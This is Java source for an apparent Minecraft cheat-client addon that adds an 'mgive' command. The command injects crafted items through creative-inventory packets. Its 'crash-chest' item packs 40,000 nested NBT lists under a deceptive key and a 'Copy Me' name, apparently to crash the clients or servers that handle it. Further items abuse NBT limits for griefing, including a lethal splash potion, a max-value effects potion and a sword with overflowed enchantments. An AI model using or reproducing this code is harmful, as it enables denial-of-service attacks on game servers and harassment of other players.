package io.gitlab.jfronny.meteoradditions.modules;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.gitlab.jfronny.meteoradditions.MeteorAdditions;
import meteordevelopment.meteorclient.systems.commands.Command;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.LiteralText;

import java.util.concurrent.Callable;

public class GiveCommand extends Command {
    public GiveCommand() {
        super("mgive", "Gives you access to special items");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        buildArg(builder, "crash-chest", () -> {
            ItemStack stack = new ItemStack(Items.CHEST);
            NbtCompound nbtCompound = new NbtCompound();
            NbtList nbtList = new NbtList();
            for(int i = 0; i < 40000; i++)
                nbtList.add(new NbtList());
            nbtCompound.put("nothingsuspicioushere", nbtList);
            stack.setNbt(nbtCompound);
            stack.setCustomName(new LiteralText("Copy Me"));
            return stack;
        });
        buildArg(builder, "kill-potion", () -> {
            ItemStack stack = new ItemStack(Items.SPLASH_POTION);
            NbtCompound effect = new NbtCompound();
            effect.putInt("Amplifier", 125);
            effect.putInt("Duration", 2000);
            effect.putInt("Id", 6);
            NbtList effects = new NbtList();
            effects.add(effect);
            NbtCompound nbt = new NbtCompound();
            nbt.put("CustomPotionEffects", effects);
            stack.setNbt(nbt);
            String name = "\u00a7rSplash Potion of \u00a74\u00a7lINSTANT DEATH";
            stack.setCustomName(new LiteralText(name));
            return stack;
        });
        buildArg(builder, "32k-sword", () -> {
            ItemStack stack = new ItemStack(Items.NETHERITE_SWORD);
            NbtList enchants = new NbtList();
            addEnchant(enchants, "minecraft:sharpness");
            addEnchant(enchants, "minecraft:knockback");
            addEnchant(enchants, "minecraft:fire_aspect");
            addEnchant(enchants, "minecraft:looting", (short)10);
            addEnchant(enchants, "minecraft:sweeping", (short)3);
            addEnchant(enchants, "minecraft:unbreaking");
            addEnchant(enchants, "minecraft:mending", (short)1);
            addEnchant(enchants, "minecraft:vanishing_curse", (short)1);
            NbtCompound nbt = new NbtCompound();
            nbt.put("Enchantments", enchants);
            stack.setNbt(nbt);
            stack.setCustomName(new LiteralText("Bonk"));
            return stack;
        });
        buildArg(builder, "troll-potion", () -> {
            ItemStack stack = new ItemStack(Items.SPLASH_POTION);
            NbtList effects = new NbtList();
            for(int i = 1; i <= 23; i++)
            {
                NbtCompound effect = new NbtCompound();
                effect.putInt("Amplifier", Integer.MAX_VALUE);
                effect.putInt("Duration", Integer.MAX_VALUE);
                effect.putInt("Id", i);
                effects.add(effect);
            }
            NbtCompound nbt = new NbtCompound();
            nbt.put("CustomPotionEffects", effects);
            stack.setNbt(nbt);
            String name = "\u00a7rSplash Potion of Trolling";
            stack.setCustomName(new LiteralText(name));
            return stack;
        });
    }

    private void addEnchant(NbtList tag, String id) {
        addEnchant(tag, id, Short.MAX_VALUE);
    }

    private void addEnchant(NbtList tag, String id, short v) {
        NbtCompound enchant = new NbtCompound();
        enchant.putShort("lvl", v);
        enchant.putString("id", id);
        tag.add(enchant);
    }

    private void buildArg(LiteralArgumentBuilder<CommandSource> builder, String name, Callable<ItemStack> stack) {
        builder.then(literal(name).executes(context -> {
            if (mc.player == null) MeteorAdditions.LOG.warn("GiveItem modules may only be used in a world");
            else if(!mc.player.getAbilities().creativeMode) ChatUtils.error("Creative mode only.");
            else {
                for(int i = 0; i < 9; i++)
                {
                    if(!mc.player.getInventory().getStack(i).isEmpty()) continue;

                    try {
                        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + i, stack.call()));
                    } catch (Exception e) {
                        e.printStackTrace();
                        ChatUtils.error("Could not create stack, see logs");
                    }
                    ChatUtils.info("Item created.");
                    return com.mojang.brigadier.Command.SINGLE_SUCCESS;
                }

                ChatUtils.error("Please clear a slot in your hotbar.");
            }
            return com.mojang.brigadier.Command.SINGLE_SUCCESS;
        }));
    }
}
